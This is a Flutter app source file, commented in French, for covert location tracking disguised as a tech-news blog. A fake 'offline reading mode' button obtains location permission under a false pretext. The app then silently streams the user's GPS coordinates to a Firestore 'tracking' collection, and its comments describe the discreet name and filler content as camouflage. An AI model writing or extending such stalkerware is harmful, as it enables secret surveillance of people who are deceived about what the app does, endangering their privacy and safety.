import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:geolocator/geolocator.dart';
import 'firebase_options.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  runApp(const MaterialApp(home: StealthTracker()));
}

class StealthTracker extends StatefulWidget {
  const StealthTracker({super.key});

  @override
  State<StealthTracker> createState() => _StealthTrackerState();
}

class _StealthTrackerState extends State<StealthTracker> {
  bool _isTracking = false;

  void _startHiddenTracking() async {
    // Demande la permission discrètement
    LocationPermission permission = await Geolocator.requestPermission();
    if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
      setState(() => _isTracking = true);
      
      Geolocator.getPositionStream(
        locationSettings: const LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 10)
      ).listen((Position position) {
        FirebaseFirestore.instance.collection('tracking').doc('web_phone_01').set({
          'lat': position.latitude,
          'lng': position.longitude,
          'time': DateTime.now().toString(),
          'type': 'Web Browser',
        });
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Mon Blog Actualités"), // Nom très discret
        backgroundColor: Colors.blueGrey,
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            const Padding(
              padding: EdgeInsets.all(20),
              child: Text("Bienvenue sur votre portail d'actualités technologiques.", 
                style: TextStyle(fontSize: 18)),
            ),
            // Un bouton qui ressemble à une option de "Lecture" ou "Abonnement"
            ListTile(
              leading: const Icon(Icons.article),
              title: const Text("Activer le mode lecture hors-ligne"),
              subtitle: const Text("Nécessite la localisation pour les news locales"),
              onTap: _startHiddenTracking, 
            ),
            if (_isTracking) 
              const Padding(
                padding: EdgeInsets.all(8.0),
                child: Text("Mode optimisé activé", style: TextStyle(color: Colors.green, fontSize: 10)),
              ),
            // Contenu de remplissage pour faire "vrai" site
            Container(height: 200, color: Colors.grey[200], margin: const EdgeInsets.all(20)),
            Container(height: 200, color: Colors.grey[300], margin: const EdgeInsets.all(20)),
          ],
        ),
      ),
    );
  }
}